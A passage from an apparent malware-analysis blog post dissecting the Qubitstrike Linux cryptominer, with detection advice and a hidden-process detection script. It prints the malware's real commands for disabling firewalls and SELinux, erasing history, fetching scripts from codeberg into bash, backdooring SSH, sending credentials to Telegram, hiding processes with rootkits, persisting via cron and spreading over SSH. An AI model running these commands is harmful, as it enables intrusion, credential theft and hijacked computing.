/usr/bin/zget\n+ [[ -f /usr/bin/curl ]]\n+ mv /usr/bin/curl /usr/bin/zurl\n+ [[ -f /bin/wget ]]\n+ [[ -f /bin/curl ]]\n++ command -v zget\n+ [[ -x /usr/bin/zget ]]\n+ req='zget -q -O -'\n+ DLr='zget -O'\n```\n\nThen we use the newly renamed fetch tool to query for our Internet IP using [ifconfig.me](https://ifconfig.me/). The script later uses this value as a client ID:\n\n```\n++ zget -q -O - ifconfig.me\n+ client=136.54.68.146\n```\n\n### The \"restart\" argument\n\nCuriously, the installer supports a `restart` argument, which provides a handy way to re-set up an infected host. It also gives you a starting point to sort out how to clean up an infected host, though it doesn’t seem to do anything about the kernel rootkit or other system-level changes:\n\n```\n    chattr -R -i /usr/share/.LQvKibDTq4/\n    rm -rf /usr/share/.LQvKibDTq4/\n    rm -rf /tmp/.LQvKibDTq4/\n    rm -rf /usr/share/.28810\n    rm -rf /etc/cron.d/netns\n    chattr -i /etc/ld.so.preload\n    chattr -i /usr/local/lib/libnetresolv.so\n    rm -rf /usr/local/lib/libnetresolv.so /etc/ld.so.preload\n    pkill -f python-dev\n    pkill python-dev\n    killall python-dev\n    mkdir -p $DIR\n    start\n```\n\n### Begin Disable Security\n\nNow things get serious, as the malware begins by actively degrading the security posture of the Linux host:\n\n```shell\n---------------------------------------\n Begin disable security \n---------------------------------------\n+ cover\n+ iptables -F\n+ systemctl stop firewalld\n+ systemctl disable firewalld\n```\n\nAt this point, it has flushed all existing iptables firewall rules and killed off the [firewalld firewall manager](https://firewalld.org/) (used mainly by Red Hat). Next, the script increases the file descriptor count from a typical value of 1024 to 65535 for reasons I'm not quite sure of.\n\n```shell\n+ ulimit -n 65535\n```\n\nThen, it begins disabling the shell command history. First, by hiding all commands that begin with a with a \" \" character:\n\n```shell\n+ HISTCONTROL=ignorespace\n```\n\n![](https://i.snap.as/qkVrmeCD.jpg)\n\nHISTCONTROL=ignorespace is an entirely new feature to me ([why does it even exist?](https://unix.stackexchange.com/questions/115934/why-does-bash-have-a-histcontrol-ignorespace-option)). The script then disables the history file altogether via a variety of mechanisms, making that setting useless anyways.\n\n```\n+ export HISTFILE=/dev/null\n+ unset HISTFILE\n+ shopt -ou history\n+ set +o history\n+ HISTSIZE=0\n```\n\nIf you are not already alerting on programs executing with these HIST\\* values, you should begin today. These values are rarely seen outside of malware, particularly HISTFILE=/dev/null. Next, the installer disables SELinux, which should be causing alarms to go off:\n\n```\n+ setenforce 0\n+ echo SELINUX=disabled\n```\n\nNext, Qubitstrike disables the Linux kernel [NMI watchdog](https://medium.com/@yildirimabdrhm/nmi-watchdog-on-linux-ae3b4c86e8d8) for what I have to assume are performance reasons - as it decreases the amount of non-maskable interrupts on the system. Perhaps it also decreases the chances that the host will reboot due to a misbehaving crypto miner:\n\n```\n+ sysctl kernel.nmi_watchdog=0\n+ sysctl kernel.nmi_watchdog=0\n+ echo '0' \u003e/proc/sys/kernel/nmi_watchdog\n+ echo 'kernel.nmi_watchdog=0' \u003e\u003e/etc/sysctl.conf\n```\n\nMore detection opportunities: calls to sysctl, edits to /proc/sys/kernel, and edits to /etc/sysctl.conf. The next thing the installer does in its preparation is modify the system's DNS resolvers. This is a great way to bypass malware detection that requires a local or custom DNS server and improve reliability if the system does not have a stable DNS server defined.\n\n```\ngrep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2\u003e/dev/null 1\u003e/dev/null; echo \"nameserver 8.8.8.8\" \u003e\u003e /etc/resolv.conf;\ngrep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2\u003e/dev/null 1\u003e/dev/null; echo \"nameserver 8.8.4.4\" \u003e\u003e /etc/resolv.conf;\n```\n\n### Squeezing out the competition\n\n![](https://i.snap.as/kSYk4Avb.webp)\n\nThe firewall rules are reprogrammed to drop packets to and from competing miners:\n\n```shell\n    iptables -A OUTPUT -p tcp --dport 3333 -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A OUTPUT -p tcp --dport 5555 -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A OUTPUT -p tcp --dport 7777 -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A OUTPUT -p tcp --dport 9999 -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A INPUT -s xmr.crypto-pool.fr -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A OUTPUT -p tcp --dport 10343 -j DROP \u003e /dev/null 2\u003e\u00261\n    iptables -A OUTPUT -p tcp --dport 10300 -j DROP \u003e /dev/null 2\u003e\u00261\n```\n\nTo further squeeze out the competition, Qubitstrike then begins killing off any process that consumes more than 99% CPU, as well as nuking known miner processes by name:\n\n```shell\nproc_kl() {\n  # KILL any bproc with 99% CPU\n  ps aux | grep -vw python-dev | awk '{if($3\u003e99.0) print $2}' | while read procid\n  do\n    kill -9 $procid\n  done\n\n  chattr -i etc/ld.so.preload \u003e /dev/null 2\u003e\u00261\n  rm -rf /etc/ld.so.preload \u003e /dev/null 2\u003e\u00261\n\n  list1=(\\.Historys neptune xm64 xmrig suppoieup '*.jpg' '*.jpeg' '/tmp/*.jpg' '/tmp/*/*.jpg' '/tmp/*.xmr' '/tmp/*xmr' '/tmp/*/*xmr' '/tmp/*/*/*xmr' '/tmp/*nanom' '/tmp/*/*nanom' '/tmp/*dota' '/tmp/dota*' '/tmp/*/dota*' '/tmp/*/*/dota*','chron-34e2fg')\n\n  list2=(xmrig xm64 xmrigDaemon nanominer lolminer JavaUpdate donate python3.2 sourplum dota3 dota)\n\n  list3=('/tmp/sscks' './crun' ':3333' ':5555' 'log_' 'systemten' 'netns' 'voltuned' 'darwin' '/tmp/dl' '/tmp/ddg' '/tmp/pprt' '/tmp/ppol' '/tmp/65ccE' '/tmp/jmx*' '/tmp/xmr*' '/tmp/nanom*' '/tmp/rainbow*' '/tmp/*/*xmr' 'http_0xCC030' 'http_0xCC031' 'http_0xCC033' 'C4iLM4L' '/boot/vmlinuz' 'nqscheduler' '/tmp/java' 'gitee.com' 'kthrotlds' 'ksoftirqds' 'netdns' 'watchdogs' '/dev/shm/z3.sh' 'kinsing' '/tmp/l.sh' '/tmp/zmcat' '/tmp/udevd' 'sustse' 'mr.sh' 'mine.sh' '2mr.sh' 'cr5.sh' 'luk-cpu' 'ficov' 'he.sh' 'miner.sh' 'nullcrew' 'xmrigDaemon' 'xmrig' 'lolminer' 'xmrigMiner' 'xiaoyao' 'kernelcfg' 'xiaoxue' 'kernelupdates' 'kernelupgrade'  '107.174.47.156' '83.220.169.247' '51.38.203.146' '144.217.45.45' '107.174.47.181' '176.31.6.16' 'mine.moneropool.com' 'pool.t00ls.ru' 'xmr.crypto-pool.fr:8080' 'xmr.crypto-pool.fr:3333' 'zhuabcn@yahoo.com' 'monerohash.com' 'xmr.crypto-pool.fr:6666' 'xmr.crypto-pool.fr:7777' 'xmr.crypto-pool.fr:443' 'stratum.f2pool.com:8888' 'xmrpool.eu')\n\n  list4=(kworker34 kxjd libapache Loopback lx26 mgwsl minerd minexmr mixnerdx mstxmr nanoWatch nopxi NXLAi performedl polkitd pro.sh pythno qW3xT.2 sourplum stratum sustes wnTKYg XbashY XJnRj xmrig xmrigDaemon xmrigMiner ysaydh zigw lolm nanom nanominer lolminer)\n\n  if type killall \u003e /dev/null 2\u003e\u00261; then\n    for k1 in \"${list1[@]}\" ; do killall $k1 ; done\n  fi\n\n  for k2 in \"${list2[@]}\" ; do pgrep $k2 | xargs -I % kill -9 % ; done\n  for k3 in \"${list3[@]}\" ; do ps auxf | grep -v grep | grep $k3 | awk '{print $2}' | xargs -I % kill -9 % ; done\n  for k4 in \"${list4[@]}\" ; do pkill -f $k4 ; done\n}\n```\n\nIf you are looking for crypto miners, that's a good list of unusual processes and command-line strings to watch for! Next, the installer kills off any process with an outgoing connection to what are likely standard miner ports, but 143 ([IMAP](https://datatracker.ietf.org/doc/html/rfc3501)), 3389 ([Remote Desktop](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)), and 6667 ([ircd](https://en.wikipedia.org/wiki/IRCd)) stand out to me.\n\n```shell\nlist=(':1414' '127.0.0.1:52018' ':143' ':3389' ':4444' ':5555' ':6666' ':6665' ':6667' ':7777'  ':3347' ':14444' ':14433' ':13531' ':15001' ':15002')\nfor k in \"${list[@]}\" ; do netstat -anp | grep $k | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v \"-\" | xargs -I % kill -9 % ; done\nnetstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\n```\n\n## Makin' $$$ with XMRig\n\nThe install script increases the number of [hugepages](https://wiki.debian.org/Hugepages) (typically 0) to 128. I’m most familiar with this optimization for things like Oracle Databases, but it also allegedly offers a [20-30% boost for some types of cryptocurrency mining](https://xmrig.com/docs/miner/hugepages). \n\n```shell\n---------------------------------------\n setup hugepages \n---------------------------------------\n+ hugepages\n+ sysctl -w vm.nr_hugepages=128\nvm.nr_hugepages = 128\n+ echo vm.nr_hugepages=128 \u003e /etc/sysctl.conf\n```\n\nAny program that references vm.nr_hugepages should be considered a possible crypto miner. For more confirmation, combine it with a check for kernel.nmi_watchdog. \n\nOnce the appropriate sysctl values are set, the script fetches and starts the miner:\n\n```shell\n+ zurl -o /usr/share/.LQvKibDTq4/xm.tar.gz https://codeberg.org/m4rt1/sh/raw/branch/main/xm64.tar.gz\n+ tar -xf /usr/share/.LQvKibDTq4/xm.tar.gz -C /usr/share/.LQvKibDTq4\n+ rm -rf /usr/share/.LQvKibDTq4/xm.tar.gz\n+ chmod +x /usr/share/.LQvKibDTq4/config.json /usr/share/.LQvKibDTq4/python-dev\n+ /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90\n```\n\nUnsurprisingly, the program is [`XMRig`](https://xmrig.com/) - the most popular option for invasive cryptocurrency miners. It's disappointing that the archive only contains an x86_64 binary, but the installer script never checks for the machine architecture. The attacker may have done that step manually within [Jupyter](https://jupyter.org/). It was a nice touch that the script author limited the CPU usage to 90% to avoid detection.\n\n## Installing the backdoor\n\nRather than implementing its own detectable backdoor, QubitStrike makes the wise decision to use [OpenSSH](https://www.openssh.com/), which is already likely on the system. This works nicely since we already know from the attack profile that the machine is on the Internet, and we've already flushed the firewall that may have prevented external SSH access.\n\n![](https://i.snap.as/l4InqXJW.jpg)\n\nThe attacker plugs in their SSH credentials (likely from a [Kali Linux](https://www.kali.org/) machine), disables the [tcpwrapper](https://en.wikipedia.org/wiki/TCP_Wrappers) controls, reconfigures sshd to allow remote root login, and starts it up. I'm not sure what the \"Port 78\" reference is all about, but I assume they are disabling a backdoor configuration from a competing crypto miner.\n\n```shell\n---------------------------------------\n SSH setup  \n---------------------------------------\n+ ssh_get\n+ '[' -f /root/.ssh/authorized_keys ']'\n+ chattr -aui /root/.ssh/authorized_keys\n+ grep -q 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali' /root/.ssh/authorized_keys\n+ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali'\n+ chattr -aui /etc/ssh\n+ chattr -aui /etc/ssh/sshd_config /etc/hosts.deny /etc/hosts.allow\n+ echo\n+ echo\n+ mkdir -p /etc/ssh\n+ sed -i -e 's/Port 78//g' -e 's/\\#Port 22/Port 22/g' -e 's/\\#PermitRootLogin/PermitRootLogin/g' -e 's/PermitRootLogin no/PermitRootLogin yes/g' -e 's/PubkeyAuthentication no/PubkeyAuthentication yes/g' -e 's/PasswordAuthentication yes/PasswordAuthentication no/g' /etc/ssh/sshd_config\n+ chmod 600 /etc/ssh/sshd_config\n+ systemctl restart ssh||service ssh restart||/etc/init.d/ssh restart||/etc/init.d/sshd restart||/etc/rc.d/sshd restart||service sshd restart||scw-fetch-ssh-keys --upgrade\n```\n\n### Phoning home\n\n![](https://i.snap.as/7P7847lO.jpg)\n\nQubitstrike collects some information about the health of the miner and the backdoor and then sends it to a [Telegram](https://telegram.org/) channel:\n\n```shell\n+ service ssh status\n+ '[' 0 -eq 0 ']'\n+ SSH_Ld=true\n+ grep python-dev\n+ grep -v grep\n+ ps aux\nroot        4088  192  0.1  42216  4768 ?        Ssl  18:24   0:02 /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90\n+ '[' 0 -eq 0 ']'\n+ MINER_stat=running\n+ DATA_STRING='IP: 136.54.68.146 | WorkDir: /usr/share/.LQvKibDTq4 | User: root | cpu(s): 4 | SSH: true | Miner: running'\n+ zurl --silent --insecure --data chat_id=DEFANGED_5531196733 --data disable_notification=false --data parse_mode=html --data 'text=IP: 136.54.68.146 | WorkDir: /usr/share/.LQvKibDTq4 | User: root | cpu(s): 4 | SSH: true | Miner: running' https://api.telegram.org/DEFANGED_bot6245402530:AAHl9IafXHFM3j3aFtCpqbe1g-i0q3Ehblc/sendMessage\n```\n\n### Credential Theft\n\nThe most disappointing part of the script is how it steals and sends credentials. Their approach is exceptionally slow: It crawls the filesystem separately for each credential type rather than using the find commands native support for finding multiple names. I blame the fin[d command's bizarre syntax and poorly written documentation](https://man7.org/linux/man-pages/man1/find.1.html), as it took me a couple of attempts to get it correct myself. \n\n![](https://i.snap.as/7Z1S4bxi.png)\n\n```shell\n+ CRED_FILE_NAMES=(\"credentials\" \"cloud\" \".s3cfg\" \".passwd-s3fs\" \"authinfo2\" \".s3backer_passwd\" \".s3b_config\" \"s3proxy.conf\" \"access_tokens.db\" \"credentials.db\" \".smbclient.conf\" \".smbcredentials\" \".samba_credentials\" \".pgpass\" \"secrets\" \".boto\" \".netrc\" \".git-credentials\" \"api_key\" \"censys.cfg\" \"ngrok.yml\" \"filezilla.xml\" \"recentservers.xml\" \"queue.sqlite3\" \"servlist.conf\" \"accounts.xml\" \"azure.json\" \"kube-env\")\n+ for CREFILE in ${CRED_FILE_NAMES[@]}\n+ find / -maxdepth 23 -type f -name credentials\n+ xargs -I % sh -c 'echo :::%; cat %'\n```\n\nContrary to most credential theft malware, QubitStrike does not attempt to steal credentials for web browsers or wallets - the authors are clearly focused on acquiring more compute resources. I took a look on my own Linux workstation to see what sort of credentials this might pick up and found:\n\n```shell\n/home/t/.config/gcloud/legacy_credentials/t@xyz.dev/.boto\n/home/t/.config/gcloud/credentials.db\n/home/t/.config/gcloud/access_tokens.db\n```\n\nAfter collection, the script sends the credentials home via a second Telegram message:\n\n```shell\n++ cat /tmp/creds\n+ SECRETS=\n+ zurl --silent --insecure --data chat_id=DEFANGED_5531196733 --data disable_notification=false --data parse_mode=html --data text= https://api.telegram.org/DEFANGED_bot6245402530:AAHl9IafXHFM3j3aFtCpqbe1g-i0q3Ehblc/sendMessage\n+ cat /tmp/creds\n+ rm /tmp/creds\n```\n\nSafety reminder: never mount your personal home directory to your malware VMs, as the find command would have traversed filesystems to discover and upload your credentials.\n\n## The kernel-level rootkit: Diamorphine\n\n![](https://i.snap.as/8SIolL5k.png)\n\nHere's where Qubitstrike gets interesting. This is the first time I've seen a casual miner with a Linux rootkit that works on a modern Ubuntu release:\n\n```shell\n---------------------------------------\n Begin hiding \n---------------------------------------\n+ ex_hid\n+ hide1\n+ ins_package\n+ type apt\n+ apt update -qq --fix-missing\n46 packages can be upgraded. Run 'apt list --upgradable' to see them.\n++ uname -r\n+ apt-get install -y -qq gcc make kmod wget net-tools linux-headers-6.2.0-27-generic -o Dpkg::Progress-Fancy=0 -o APT::Color=0 -o Dpkg::Use-Pty=0\n...\n+BKq2HVGRbshW1jerMuLLi6PyQR7bb3ORyGJqEJJ4oksOHE7f1/... | base64 -d\n+ tar -xf /usr/share/.LQvKibDTq4/hf.tar -C /usr/share/.LQvKibDTq4/\n+ cd /usr/share/.LQvKibDTq4\n+ make\nmake -C /lib/modules/6.2.0-27-generic/build M=/usr/share/.LQvKibDTq4 modules\nmake[1]: Entering directory '/usr/src/linux-headers-6.2.0-27-generic'\n  CC [M]  /usr/share/.LQvKibDTq4/diamorphine.o\n  MODPOST /usr/share/.LQvKibDTq4/Module.symvers\n  CC [M]  /usr/share/.LQvKibDTq4/diamorphine.mod.o\n  LD [M]  /usr/share/.LQvKibDTq4/diamorphine.ko\n  BTF [M] /usr/share/.LQvKibDTq4/diamorphine.ko\nSkipping BTF generation for /usr/share/.LQvKibDTq4/diamorphine.ko due to unavailability of vmlinux\n+ insmod diamorphine.ko\n```\n\nRather than fetching the rootkit, it cleverly embeds it as a base64 string and decodes it - providing ample detection opportunity. If you ever see a base64 string that begins with `H4sI`, you know you are dealing with a base64-encoded gzip file (another detection hint). Since kernel module binaries are not portable, Qubitstrike installs a compiler and the headers necessary before building the rootkit.\n\nSo, what is [Diamorphine](https://github.com/m0nad/Diamorphine)? It's easily the most popular open-source rootkit for Linux. I've long poo-pooed kernel-mode rootkits in Linux as unsupportable due to the constant churn of the Linux kernel, but surprisingly, Diamorphine has been updated to work on modern Linux kernels! It works perfectly on a fully patched Ubuntu 23.04 or 23.10 machine (Linux 6.2.0 \u0026 6.5.3). Diamorphine does segfault on my ArchLinux laptop (Linux 6.5.7), showing that Linux rootkits are still somewhat fragile.\n\nDiamorphine has a unique control mechanism: signals. You can see it in action in Qubitstrike:\n\n```shell\n+ echo 'Hiding process ( python-dev ) pid ( 4088 )'\nHiding process ( python-dev ) pid ( 4088 )\n+ kill -31 4088\n```\n\nHow does the process hiding work? Diamorphine intercepts calls to the [getdents64(2)](https://linux.die.net/man/2/getdents64) system call, used in turn by [readdir(3)](https://linux.die.net/man/3/readdir). On Linux, system utilities, such as ps or netstat, read the contents of the `/proc` directory to know what processes or tasks are currently running - this malware will filter out the pid entry for any processes that have been passed signal 31 (the unused [SIGSYS](https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf) signal).\n\nIn addition, Diamorphine has an option of hiding any files matching a `MAGIC_PREFIX`. This is commonly used to hide directories, but Qubitstrike does not take advantage of it. Diamorphine also supports other signals, notably  `-64`, which upgrades a process to root access. From [diamorphine.c](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c):\n\n```c\nvoid\ngive_root(void) {\n...\n    newcreds-\u003euid.val = newcreds-\u003egid.val = 0;\n    newcreds-\u003eeuid.val = newcreds-\u003eegid.val = 0;\n    newcreds-\u003esuid.val = newcreds-\u003esgid.val = 0;\n    newcreds-\u003efsuid.val = newcreds-\u003efsgid.val = 0;\n...\n}\n```\n\nThis signals-based mechanism makes Diamorphine easy to detect. Simply iterate over every signal and see what happens! We'll show an example later.\n\n## User-mode rootkit: processhider\n\nIf Diamorphine fails to build, QubitStrike falls back to using a modified version of  [github.com/gianlucaborello/libprocesshider/blob/master/processhider.c](https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c) - a user-mode rootkit.\n\n```shell\n+ echo I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg... | base64 -d\n+ sed -i s/procname/python-dev/g /usr/share/.LQvKibDTq4/prochid.c\n+ chattr -ia /etc/ld.so.preload /usr/local/lib/\n+ gcc -Wall -fPIC -shared -o /usr/local/lib/libnetresolv.so /usr/share/.LQvKibDTq4/prochid.c -ldl\n+ echo /usr/local/lib/libnetresolv.so \u003e /etc/ld.so.preload\n+ '[' -f /usr/local/lib/libnetresolv.so ']'\n+ chattr +i /usr/local/lib/libnetresolv.so\n+ chattr +i /etc/ld.so.preload\n```\n\nThis malware intercepts userland requests to glibc's [`readdir(3)`](https://linux.die.net/man/3/readdir) function. If the name matches `python-dev`, the process is hidden in much the same way as Diamorphine. In the old days, user-mode rootkits were deployed by setting the [`LD_LIBRARY_PATH`](https://www.hpc.dtu.dk/?page_id=1180)` environment variable`, but on Linux, you can get the same result by adding the library path to `/etc/ld.so.preload`.\n\nIn 99% of environments, this file shouldn't exist. Check for it.\n\n## Establishing Persistence\n\n![](https://i.snap.as/aArwlOKd.webp)\n\nQubitStrike will establish persistence through cron. First, it grabs the killer script, which shares the same competition killers we saw before, from Codeberg, and installs it to cron:\n\n```shell\n+ cron_set\n+ killerd=/usr/share/.28810\n+ mkdir -p /usr/share/.28810\n+ [[ zurl -o != '' ]]\n+ zurl -o /usr/share/.28810/kthreadd https://codeberg.org/m4rt1/sh/raw/branch/main/killer.sh\n+ chmod +x /usr/share/.28810/kthreadd\n+ chattr -R -ia /etc/cron.d\n+ echo -e '*/1 * * * * root /usr/share/.28810/kthreadd' \u003e /etc/cron.d/netns\n```\n\nIt also sets the miner to start on reboot:\n\n```shell\n+ echo '@reboot root /usr/share/.LQvKibDTq4/python-dev -c /usr/share/.LQvKibDTq4/config.json' \u003e /etc/cron.d/apache2\n```\n\nOnce a day, it starts the QubitStrike installer again using the latest code. Since there is no other cron task to reinstall the Diamorphine module, this means there can be up to a full day where the miner is running unhidden. I like how it hedges its bets by using the renamed `zget` or `curl` commands:\n\n```shell\n+ echo '@daily root zget -q -O - https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash' \u003e /etc/cron.d/apache2.2\n+ echo -e '0 0 */2 * * * root curl https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash'  \u003e /etc/cron.d/netns2\n+ echo \"0 * * * * wget -O- https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash \u003e /dev/null 2\u003e\u00261\" \u003e\u003e /etc/crontab\n+ echo \"0 0 */3 * * * $req https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash \u003e /dev/null 2\u003e\u00261\" \u003e\u003e /etc/crontab\n+ chattr -R +ia /etc/cron.d\n+ chattr -R +i /usr/share/.LQvKibDTq4\n```\n\n## The viral component of QubitStrike\n\n![](https://i.snap.as/CV7Rixe9.png)\n\nOne of the surprising features of QubitStrike is that it will attempt to replicate itself to any systems it finds in `/root/.ssh/known_hosts`:\n\n```shell\nssh_local() {\nif [ -f /root/.ssh/known_hosts ] \u0026\u0026 [ -f /root/.ssh/id_rsa.pub ]; then\n  for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '$req https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash \u003e/dev/null 2\u003e\u00261 \u0026' \u0026 done\nfi\n}\n```\n\nTo be more effective, the installer should have also parsed other users `known_hosts` files, but perhaps I shouldn't be giving malware authors tips.\n\n## The coup de grace: log truncation\n\nBefore exiting the installer, QubitStrike truncates many important system logs:\n\n```shell\nlogs=(/var/log/wtmp /var/log/secure /var/log/cron /var/log/iptables.log /var/log/auth.log /var/log/cron.log /var/log/httpd /var/log/syslog /var/log/wtmp /var/log/btmp /var/log/lastlog)\n  for Lg in \"${logs[@]}\"; do\n    echo 0\u003e $Lg;\n  done\n```\n\nIt does not do anything about truncating systemd logs, though.\n\n## Detecting Qubitstrike from a shell\n\n![](https://i.snap.as/KVms6GJG.png)\n\nOn Linux, process hiders are hilariously simple to detect. In my experience, ro rootkits bother to hide all of the /proc lookup points, preferring instead to just hide from the /proc directory list.\n\nMy detection technique is to iterate over all possible process ID numbers and check for the existence of /proc/$pid/something file. If it exists, cross-reference it against the directory listing of /proc, and report missing entries. This works swimmingly:\n\n```shell\n#!/bin/bash\nstart=$(date +%s)\nfor pid in *; do\n    visible[$pid]=1\ndone\n\nfor i in $(seq 2 \"$(cat /proc/sys/kernel/pid_max)\"); do\n    [[ ${visible[$i]} = 1 ]] \u0026\u0026 continue\n    [[ ! -e /proc/$i/status ]] \u0026\u0026 continue\n    [[ $(stat -c %Z /proc/$i) -ge $start ]] \u0026\u0026 continue\n\n    #  pid is a kernel thread\n    [[ $(awk '/Tgid/{ print $2 }' \"/proc/${i}/status\") != \"${i}\" ]] \u0026\u0026 continue\n\n    exe=$(readlink \"/proc/$i/exe\")\n    cmdline=$(tr '\\000' ' ' \u003c\"/proc/$i/cmdline\")\n    echo \"- hidden $(cat /proc/$i/comm)[${i}] is running ${exe}: ${cmdline}\"\ndone\n```\n\nHere's what this script outputs on a QubitStrike victim host:\n\n```log\n- hidden python-dev[27158] is running /usr/share/.LQvKibDTq4/python-dev: /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90 \n```\n\nIf a rootkit uses a kernel module, as Diamorphine does, it's almost certainly going to impact the [kernel taint](https://www.kernel.org/doc/html/v4.19/admin-guide/tainted-kernels.html) value, as well as leave evidence behind in the `dmesg` buffer. QubitStrike and Diamorphine are no exception:\n\n```\nkernel taint value: 12288\n* matches bit 12: externally-built (out-of-tree) module was loaded\n* matches bit 13: unsigned module was loaded\n\ndmesg:\n[ 1721.518533] diamorphine: loading out-of-tree module taints kernel.\n[ 1721.536521] diamorphine: module verification failed: signature and/or required key missing - tainting kernel\n```\n\nNow for the new star of the show, the script that uncovers kernel rootkits that communicate via signal:\n\n```diff\n-- [ rootkit-signal-handler.sh ] -----------------------------------------------\nNOTE: root-escalation detection requires a non-root user\n- SIGNAL 31 made /proc/46233 (this process) invisible!\n- SIGNAL 63 caused /proc/modules to change:\n--- /tmp/tmp.sjwv6iMtDx 2023-10-20 02:34:25.912665169 +0000\n+++ /tmp/tmp.L1e9HVPFGi 2023-10-20 02:34:25.964663794 +0000\n@@ -10,6 +10,7 @@\n bridge\n btrfs\n ccp\n+diamorphine\n dm_multipath\n drm\n drm_kms_helper\n- SIGNAL 31 made /proc/46233 (this process) visible again!\n- SIGNAL 63 caused /proc/modules to change:\n--- /tmp/tmp.IoOFxxR8en 2023-10-20 02:34:34.156522332 +0000\n+++ /tmp/tmp.AWQeOosqOh 2023-10-20 02:34:34.212521840 +0000\n@@ -10,7 +10,6 @@\n bridge\n btrfs\n ccp\n-diamorphine\n dm_multipath\n drm\n drm_kms_helper\n```\n\nIt's also easy to detect the SSH keys, hidden directories, and crontab entries - if you want to see how, check out the [tstromberg/sunlight](https://github.com/tstromberg/sunlight) repo.\n\n## Detecting Qubitstrike with 